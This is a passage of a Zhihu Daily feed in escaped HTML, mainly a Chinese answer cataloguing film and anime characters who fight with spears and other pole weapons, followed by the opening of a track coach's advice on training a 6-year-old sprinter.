src=\"https://pic1.zhimg.com/v2-c115b17f3287812d5b52c9c098b7eecd_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-7bb30d43ce13f23b34cee8e199fc9b92_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《哪吒传奇》，2003 年，神话改</figcaption></figure><p>中国的<strong>古典神话、历史演义、英雄传奇</strong>这些题材，长兵器主角很多。但是这些题材都是几百年前的老古董，翻来覆去就那几样，<strong>西游、封神、三国、隋唐、水浒……</strong></p>\n<p>基本都是<strong>吃老本、新瓶装旧酒</strong>，最多魔改一下就端上来了，很少有<strong>原创作品</strong>会出现使用长杆武器的主角。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-9fac33ae136c8ef55de6e340cd0e5d50_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《三国志》东映剧场版，1992 年，小说改</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-5ec36f403f4f0406b070de3744f87d39_720w.jpg?source=8673f162\" alt=\"\"><figcaption>关羽斩杀孔秀</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-8a6a57411ffc3aada296a06ff1785b98_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《三国演义》央视动画版，2009 年，小说改</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-1a0d1e65b293110284cf9aee04fd1ac0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>赵云枪挑夏侯恩</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-2d89ae10b94901bf5540f7b71cc7307b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《水浒传之英雄本色》，1993 年。这部水浒传电影不错，很有意思</figcaption></figure><p>而<strong>武侠、仙侠、玄幻</strong>题材，刀剑主角最多，很少出现使用长杆的<strong>“主要角色”</strong>。这些是现代新生题材，虽然也有玩烂的倾向，但是终归比<strong>古典神话、历史演义、英雄传奇</strong>这些题材年轻，也能玩很久。</p>\n<p>至于能不能玩好，那另说。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-de3a54cc35bbce25bf64e4dc3cadaf8d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《新少林五祖》，1994 年</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-7796edccd11767dd396f0cfa7afc5e1e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>这长枪可以伸缩，长度范围约 1~6 米</figcaption></figure><figure><img src=\"https://pica.zhimg.com/v2-490c5cd651fbea7235428d0b58f06be2_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《英雄》，2002 年。甄子丹的花枪耍得非常漂亮，感觉抢了李连杰的风头</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-b97f70b06fee44be3b48889c5c6f95c8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《古剑奇谭之流月昭明》，2018 年</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-648b10a6733c3241efb563d0efa2fa27_720w.jpg?source=8673f162\" alt=\"\"><figcaption>这长枪也能伸缩，还能变形成护腕、回旋镖，不愧是玄幻电影</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-08cc703787128b0a90725564994fcca7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>为什么电影、动漫里头主角手中的兵器都是刀剑不用长枪或长棍吗？</p>\n<p><a href=\"https://www.zhihu.com/question/292797756/answer/1256954817\">为什么电影、动漫里头主角手中的兵器都是刀剑不用长枪或长棍吗？</a></p>\n<p>为何影视以及动漫里短兵例如刀剑甚至匕首都能随便虐拿长柄武器的？</p>\n<p><a href=\"https://www.zhihu.com/question/364987617/answer/965820185\">为何影视以及动漫里短兵例如刀剑甚至匕首都能能随便虐拿长柄武器的？</a></p>\n<p>中国有没有像日本武士刀一样，有值得文化宣传输出的帅气冷兵器？</p>\n<p><a href=\"https://www.zhihu.com/question/407160795/answer/1346208520\">中国有没有像日本武士刀一样，有值得文化宣传输出的帅气冷兵器？</a></p>\n<hr>\n<p><strong>接下来，我再例举一些使用长杆兵器的动画人物</strong><strong>一、《雾山五行》，2020 年</strong><strong>山子（配角）</strong></p>\n<p>这段长枪打戏，虽然跟<strong>实战枪术</strong>有些距离，但是作为<strong>影视表演枪术</strong>，还是很有中国武术韵味的，长枪打斗灵动多变。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2fed95035c9d8b6193a5bf6114f6a223_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-7a6c027806d8e03b631ba9755958f011_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-b9d8df33378a7f40c03ed1ce502fd997_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-e00f8414f50d2fe2ea3052b91d696c60_720w.jpg?source=8673f162\" alt=\"\"><figcaption>枪尾可以拔出短刀</figcaption></figure><p><strong>二、《大理寺日志》，2020 年</strong><strong>李饼（主角）——猫爷</strong></p>\n<p>这个桥段类似<strong>“项庄舞剑”</strong>。</p>\n<p>傩戏表演时，李饼用长枪对付鬼面刺客。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0e005c77e0fc6eb5f0205bdfad5dbcaf_720w.jpg?source=8673f162\" alt=\"\"><figcaption>刺客使用双头枪</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-08bf53b6c5e32cdbb9ba96ac33c16eb5_720w.jpg?source=8673f162\" alt=\"\"><figcaption>李饼使用普通长枪</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-7b0e2a7945f3e1338b17af29330e5fd9_720w.jpg?source=8673f162\" alt=\"\"></figure><p>动作设计——林魂（《雾山五行》的导演）</p>\n<p>林魂导演很喜欢长枪，对此做了很多研究，所以他的长枪打戏特别给力，林导牛逼！</p>\n<p><strong>平时，李饼只佩刀——环首刀</strong></p>\n<p>这个设定很好，虽然主角精通多种武器，但是会根据场合，选择合适的武器。</p>\n<p>这样更加贴近现实，具有浓厚的生活气息。</p>\n<p>《大理寺日志》的世界观，原型是唐朝，每集片尾都会介绍唐朝的<strong>制度、风俗、饮食</strong>……</p>\n<p><strong>大理寺，官署名。相当于现代的最高法院，掌刑狱案件审理，长官名为大理寺卿，位九卿之列。</strong></p>\n<p><strong>大理寺设少卿二人，从四品上（李饼的职位）</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-26c312b95185f28783eee8398d0394d4_720w.jpg?source=8673f162\" alt=\"\"><figcaption>这把环首刀，到底是“横刀”还是“障刀”，不好说</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-2166932436630ffbc52732c4a99afe8e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>李饼用刀对付马车上的刺客</figcaption></figure><p><strong>类似例子</strong><strong>三顾茅庐时，关羽和张飞只带剑</strong></p>\n<p>登门拜访，带长杆武器（大杀器）煞风景，佩剑更加合乎礼仪。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e7352cdb1fe3e3b9cae83b290cacc7a9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《三国演义》，1994 年</figcaption></figure><p><strong>动画版里，关羽、张飞甚至没带武器</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8d63daf88d852f601686652874be2746_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《三国演义》，2009 年</figcaption></figure><p><strong>《水浒传》里的林冲，不会提长枪上街</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-579c9700bb65439f9b212dec422cbbb3_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-c5eba768017ac4fc8f088cda5bdde3a0_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-3e269ec8347267bc69b9eb25eeec8015_720w.jpg?source=8673f162\" alt=\"\"><figcaption>鲁智深在自家院子里耍月牙铲（方便铲）</figcaption></figure><p><strong> </strong></p>\n<p>方便铲，原先是佛家中，参学行脚，或者是修头陀的苦行者所用的法器，出行时可以此为念，提醒自己修行，又可以用它来掩埋路上未入土的尸体，以免其暴露在外，任人践踏，灵魂不得安宁。其次，方便铲还可用于修补不平之路，用作扁担，挑挂包袱。</p>\n<p>这类器械，跟<strong>草叉、柴刀、斧头、连枷</strong>性质差不多，都是工具，可以兼职当武器。</p>\n<p><strong>三、《戚继光》，2014 年</strong></p>\n<p>戚将军十八般武艺样样精通，还是武器发明家。在这部动画里，他最常用的是<strong>长枪</strong>，偶尔使用<strong>腰刀</strong>。</p>\n<p>特殊情况下还用过<strong>竹竿、弓箭、流光神机箭、地雷</strong>等等。</p>\n<p>主角的长枪能变形，变形后像狼筅，可以架格敌人的武器，然后缴械。这魔改挺有意思。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-dec980b384949538e4352563f8f58b69_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-359d2063ece015439eec82d8ba6819fc_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-e3fb80b69a77bf1ca6771f735094c4bc_720w.jpg?source=8673f162\" alt=\"\"><figcaption>狼筅 + 长枪</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-c5b3221f5ce21aafd5bed664c9d26ef0_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-c12f65b1ad7fe543bd92998d9e8bc3bb_720w.jpg?source=8673f162\" alt=\"\"><figcaption>腰刀——雁翎刀</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-dca325b971da90cd0a59eb19c68cc8cc_720w.jpg?source=8673f162\" alt=\"\"><figcaption>邪魅一笑</figcaption></figure><p>这部少儿动画，我觉得还是不错的。就是砍人不流血，我看着很违和。也罢，这是给小孩看的动画，可以理解。</p>\n<p>本片打戏很像无双，导演八成是无双迷。恰好，《真三国无双》里杀人也不流血。</p>\n<p><strong>四、《斩！赤红之瞳》，2014 年</strong><strong>布兰德（配角）</strong></p>\n<p>铠甲造型很像假面骑士，这个人物精通长枪，剑术也不错。平时用长枪战斗，特殊情况使用剑。</p>\n<p>这种设定很好，更贴近现实，比较合理。精英枪兵，不只会用长枪。</p>\n<p><strong>动画风格很血腥、残酷、黑暗。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-90f48deab2727a2af722b88bb5ceeca9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>日本人经常把斧戟、方天戟一类的武器叫做“长枪”</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-63a1e0125931f9d8dbe11fa5dabb142a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-623a15dffb17176d074c84b9f91ca82b_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>布兰德战死后，装备被男主角继承（盔甲和武器）</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0089281a890f2e7bdcc50ff923d2896e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>左一男主角塔兹米，右一女主角赤瞳</figcaption></figure><p><strong> </strong><strong>五、《恋姬无双》，2008 年</strong></p>\n<p>娘化三国人物，架空世界，剧情都是原创，挂个三国人物的名字罢了。</p>\n<p>这是 GalGame 改编动画，剧情就是讲一群美少女的冒险、战斗和日常，一共出了三季。</p>\n<p>风格比较欢快，砍人不流血，主要角色都不会死亡。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d4032e7870deeccb52908cd18e6e3b7b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>关羽</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-2160f783d3655095acfabcfc2b5909ed_720w.jpg?source=8673f162\" alt=\"\"><figcaption>张飞</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-c7e3e0a4232e7b00970191e367c9dc8a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>赵云</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-de5b3bf7db535bb89c89fcda665e9254_720w.jpg?source=8673f162\" alt=\"\"><figcaption>赵云加入队伍</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-c765969e9a50ead76cb656486f7bb322_720w.jpg?source=8673f162\" alt=\"\"><figcaption>马超</figcaption></figure><p><strong>特殊情况，关羽也会使用刀剑</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e480803375a1ce38761f6849aa44b0d4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-d4b232d385fe719a055f10913987eb04_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>这里联动一下</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-5a19b7ee36305bc53a03d8a4292a8648_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong> </strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-2058e57500e9ba4d47df527a43842c3a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>嘉靖版《三国志通俗演义》</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-59b13ecce91d0f34138a4e64d1bf9556_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《三国志》东映剧场版，卞喜的流星锤被关羽挡开</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-406fa8952cbdd555346f2ea43dd0e8b9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>卞喜逃跑</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-60a775d86f7ecafd3cb93a4ca7ffba24_720w.jpg?source=8673f162\" alt=\"\"><figcaption>连人带柱子，一刀四段</figcaption></figure><p><strong> </strong><strong> </strong><strong>六、《一骑当千》，2003 年</strong></p>\n<p>同样是娘化三国人物，卖肉情节特别多，典型的肉番，不过剧情和打斗还不错。女一号<strong>孙策</strong>，男一号<strong>周瑜</strong>。</p>\n<p>部分人物依然是男性，例如董卓、曹操、周瑜、夏侯惇、甘宁等等。</p>\n<p>动画一共有四季，还有几个 OVA。</p>\n<p>后期加入了日本历史人物：卑弥呼、源义经、弁庆、宫本武藏、柳生十兵卫……</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-221076e94004429596817945cbd87d30_720w.jpg?source=8673f162\" alt=\"\"><figcaption>关羽</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-a5eb8676931e90a4950cf4c0f41f494d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>张飞、卑弥呼。张飞后期才用上蛇矛，实力成长比关羽慢了很多</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-48c53102b75133e8a4e5bc8000a55419_720w.jpg?source=8673f162\" alt=\"\"><figcaption>武藏坊弁庆</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-9abcec45bb95637f805400969425d019_720w.jpg?source=8673f162\" alt=\"\"><figcaption>宝藏院胤舜、柳生十兵卫</figcaption></figure><p><strong>七、《义风堂堂！！兼续和庆次》，2013 年</strong><strong>前田庆次（主角之一）</strong></p>\n<p>骑大马、提长枪的浪子，人设源于《花之庆次》，是游侠一类的人物。</p>\n<p>另一个男主直江兼续，上战场也用长枪，但是平时不带长枪出门。</p>\n<p>而前田庆次，是日常<strong>骑大马、提长枪</strong>到处溜达，特立独行的<strong>“倾奇者”</strong>。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-fe04186992b7844e257639eb027a2f9c_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-739bc308ae41fcfa679b84a0bcc78765_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-40e372a2b89135f1f19adb5f45e7ce9b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>朱红色枪杆的“朱枪”，只有精英武士才能持有</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-b1b61184fafe97a0049a21a5e81aeae4_720w.jpg?source=8673f162\" alt=\"\"><figcaption>庆次搞到了一套西洋板甲，穿出来显摆</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-2bc7dc857297fc6521c4f90007b80067_720w.jpg?source=8673f162\" alt=\"\"><figcaption>很拽啊</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-ea9062285728a890d16bf67dd64a53f3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>这个场景，挺有意境</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-64e1ceb405a6e614d387bdb20d295d40_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《花之庆次》</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-e17b7a788d6be25e76516e13eb51c6f8_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong> </strong><strong> </strong><strong>八、《战国 BASARA》，2009 年</strong></p>\n<p>游戏改编动画，<strong>魔幻 + 热血 + 搞笑</strong>风格，非常中二，已经出了三季。</p>\n<p>由于是<strong>历史</strong>魔改作品，跟<strong>军事</strong>也沾点边，所以使用长杆武器的人物不少。</p>\n<p>男主角之一的真田幸村，使用双枪（两根十文字枪）。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7ed728f4eea741e0449410a91ad1879c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>真田幸村</figcaption></figure><figure><img src=\"https://pica.zhimg.com/v2-b512d38550aea67538f4897d7fa3ea5f_720w.jpg?source=8673f162\" alt=\"\"><figcaption>德川家康、本多忠胜（本多高达）</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-00ad8371a576c2f9752e7470bdb85e44_720w.jpg?source=8673f162\" alt=\"\"><figcaption>本多高达的武器是长杆电钻</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-a862308599d43398d325e71b4f872ecd_720w.jpg?source=8673f162\" alt=\"\"><figcaption>阿松</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-6f2b5c5d255023af64b457faad2b4b7b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>前田庆次</figcaption></figure><p>这里面的前田庆次，使用一把两米五以上的<strong>“野太刀”</strong>，刀名叫<strong>“超刀·朱枪”</strong>，挺违和的，这就是<strong>太刀粉</strong>的执念吗？</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-2c3e74879cc5638452413d880c1d6d91_720w.jpg?source=8673f162\" alt=\"\"><figcaption>前田庆次</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-a86ca30f0c6207fd0b5da6bcbdac20ec_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-d482e6ba2c3daac1770776e4d5914628_720w.jpg?source=8673f162\" alt=\"\"><figcaption>浮世绘和《战国 BASARA》里的前田庆次</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-e45589c070978c282730b7b572728bce_720w.jpg?source=8673f162\" alt=\"\"><figcaption>到处装逼的太刀侠</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-b393d18d49404fcf37a13eb9d0e745c2_720w.jpg?source=8673f162\" alt=\"\"><figcaption>太刀粉的执念，这刀有 3 米以上</figcaption></figure><p><strong>九、《战国无双》，2015 年</strong></p>\n<p>本片和《战国 BASARA》一样，都是游戏改编动画，但是风格没那么搞笑，反倒多了一些历史的悲凉。</p>\n<p>因为剧情跟<strong>历史、战争</strong>有关，所以长杆武将也不少。</p>\n<p>然而，由于经费不足，打戏表现不佳。用了很多中国的廉价原画师和动画师，暗荣真抠门。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-de5014715c838017e4a628fedc8716cc_720w.jpg?source=8673f162\" alt=\"\"><figcaption>真田幸村</figcaption></figure><figure><img src=\"https://pica.zhimg.com/v2-969febc2b4dda41b8bc8791e564d2931_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-403502b485efbd06e36fb2ca313cb88e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>前田庆次</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-63316c260cf305476d10681951f8dad3_720w.jpg?source=8673f162\" alt=\"\"><figcaption>本多忠胜</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-5e6c28452e4cc0590241f94e8d7951a1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>加藤清正、福岛正则</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-0b370aab3f1ba41b14f480a4b2bf823c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>井伊直政</figcaption></figure><p><strong>十、《鬼眼狂刀》，2002 年</strong><strong>红虎（配角）</strong></p>\n<p>使用十文字枪的男子，主角团成员之一，真实身份是德川秀忠。</p>\n<p>我小时候看的动画，具体剧情记不清了，但是印象不错。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8f9731a687774e379af4d9c235d01c60_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-1f902eb2b66ad06c5d03addb746d52bf_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-7336e90135b212e16a1165627dab0996_720w.jpg?source=8673f162\" alt=\"\"><figcaption>拿木刀的就是主角之一：鬼眼狂</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-cc2669b8b530a331fb0ecba97bbe6da9_720w.jpg?source=8673f162\" alt=\"\"><figcaption>十文字枪能缩短，放在裤腰带上</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-badf0895fa3247867a78cf9db7488d36_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>十一、《境界线上的地平线》，2011 年</strong><strong>本多忠胜、本多二代</strong></p>\n<p>这部动画世界观挺复杂的，大概算是中世纪历史背景下的<strong>科幻 / 奇幻世界</strong>。</p>\n<p>原作小说的设定集特别厚，动画篇幅有限，所以某些剧情很难看懂。</p>\n<p>其实剧情还是不错的，打戏也很精彩，一共有两季。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-5338422b1550126714409b3cf3002e4d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>本多忠胜</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-66a1bfb959fff38cba6890343f70a257_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-853e860a6041d52a3fdc05c4505cb2de_720w.jpg?source=8673f162\" alt=\"\"><figcaption>本多二代，最初使用刀</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-3d28cdfbda883a717d585c739cec05ba_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-e6b18532164143b8cea601eade12f69b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-e90d3bc60771c762244b8cc23e158cad_720w.jpg?source=8673f162\" alt=\"\"><figcaption>长枪可以伸长，估计有六七米</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-b0cee6502d40adda82246f4b7ae597e1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>撑杆跳</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-e544ab442dc92de0d83fae3d524adcae_720w.jpg?source=8673f162\" alt=\"\"><figcaption>这把 40 米大刀也很夸张</figcaption></figure><p><strong>十二、《记录的地平线》，2013 年</strong><strong>克拉斯提</strong></p>\n<p>这算是比较硬核的<strong>异世界穿越番</strong>了，玩家穿越进游戏世界，变成游戏里自己的角色——<strong>真正的角色扮演</strong>。动画一共有三季。</p>\n<p>此异世界的框架，基本就是一款 MMORPG，但是实际上又跟游戏有一些不同。</p>\n<p>动画中的团体战斗，特别讲究团队配合，队长的作用非常突出，蛮符合这类游戏的风格。</p>\n<p>这个克拉斯提，不知道算不算配角，风头都快盖过男主角了。群像类动画，不太好确定这点。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4f1b069f8788aa4b9bbe569c55211c20_720w.jpg?source=8673f162\" alt=\"\"><figcaption>克拉斯提，使用长杆大斧</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-ef9c1a5dcfac1279ea164c72d9a35b18_720w.jpg?source=8673f162\" alt=\"\"><figcaption>黄毛精灵是 NPC</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-9533cd7bdda9dd631ea4e5151b9ee896_720w.jpg?source=8673f162\" alt=\"\"></figure><p>个人精力有限，其他动画中使用长杆武器的人物，我就不一一例举了，太累。</p>\n<p>有一点是不变的，那就是 ACG 作品里，<strong>长杆主角</strong>总是比<strong>刀剑主角</strong>少。</p>\n<p>长杆武器，包括<strong>长棍、长枪、长戟、长杆刀、长杆斧……</strong></p>\n<p><strong>日本长卷，没见过主角用它。</strong></p>\n<p>即使同为日本刀，长卷的刃柄比接近 1:1，就没有了<strong>“主角命”</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ae6f3b015e9d522578add180b5be216b_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>薙刀在文艺作品里，几乎成女性专用武器了</strong></p>\n<figure><img src=\"https://pica.zhimg.com/v2-640fac5e9019b9f4a0301fb5ff2a7ee8_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>薙刀唯一的著名男性代表人物，好像只有弁庆。而且他还不是主角，主角是源义经（用太刀）</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-ff87f5c6ec506d9bbfa65227f49306e0_720w.jpg?source=8673f162\" alt=\"\"><figcaption>弁庆和源义经</figcaption></figure><figure><img src=\"https://pic3.zhimg.com/v2-7d1cf072885cfcf3d348d642e4296924_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《义经英雄传》里的弁庆</figcaption></figure><p><strong>这些西洋长杆武器，没有著名主角带，所以经常是杂兵的象征。</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-3cf164f0b30aae23aa52bb78ebced318_720w.jpg?source=8673f162\" alt=\"\"><figcaption>蝠翼镗、西洋戟、阔头枪、长矛</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-65c1d799c8abdfb950bbfe9c39b38ba4_720w.jpg?source=8673f162\" alt=\"\"><figcaption>西洋戟、单刀戟</figcaption></figure><p><strong>没有对比，就没有伤害</strong></p>\n<p><a href=\"https://www.zhihu.com/question/346625869/answer/830286457\">刀剑的文化地位为何这么高，高到碾压其他所有冷兵器？</a></p>\n<p><a href=\"https://www.zhihu.com/question/333670924/answer/743333707\">为什么在 ACG 作品里，超长巨剑和大太刀能频繁出现，却鲜有“超长枪”？</a></p>\n<figure><img src=\"https://pica.zhimg.com/v2-b860c56e1bc227b5000efe073ad08fcf_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-19fec932e4c5e56f56119638383583f8_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-8312259650860ddad40a3fd8e7321858_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-8ae981895b279aaa89f460984e57d756_720w.jpg?source=8673f162\" alt=\"\"></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/474747035\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738826"},{"title":"6 岁的孩子说想学跑步，成为像苏炳添那样的运动员，作为家长该如何培养？","date":"2021-08-02 03:45:08","description":"\n<p>田径出身的一名大学田径队教练来谈一谈我的看法，希望有所借鉴。</p>\n<p>我先从专业的角度，来给一些解答。</p>\n<h2>7-14岁是孩子速度发展的一个窗口期</h2>\n<p>人的身体素质，包括速度、力量、耐力、灵敏、平衡等，在不同的年龄段，都会有发展比较迅速或缓慢的时候，当然儿童处在成长期，身体各指标都会快速增长，但总有增长尤为突出的某项指标，我们把这段快速增长的一段时期，称为快速发展的“窗口期”。</p>\n<p>为什么小学会把快速跑当成一个衡量身体素质的重要指标呢？就是因此此年龄段，正好处在孩子速度快速发展的阶段，在这个阶段有意识地培养孩子的速度，提升孩子的爆发力，就会事半功倍。</p>\n<p>作为一名田径运动员、教练，苏炳添能够以打破亚洲纪录记录的成绩闯进奥运会男子100米决赛，成为第一个站在飞人赛道的黄种人，我由衷感到自豪！这个时候，如果孩子热爱体育，有这样的信念支撑他，有这么一个强有力的偶像光环作为他的榜样，作为父母，我给的建议是：</p>\n<p><b>支持他，从心理和实际行动上，给他鼓励和帮助！</b></p>\n<p><b>因为我深知，扎根一个梦想的种子，对于一个满怀激情的孩子来说，是无比重要！而此时父母给予的帮助对孩子来说，定会弥足珍贵！</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-96c0e546fd86fab8e1ef5412b8270e58_720w.jpg?rss\" data-rawwidth=\"2428\" data-rawheight=\"1358\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-96c0e546fd86fab8e1ef5412b8270e58\" data-watermark-src=\"v2-0c8f2561dccc838fad0ffff2f2d7ff93\" 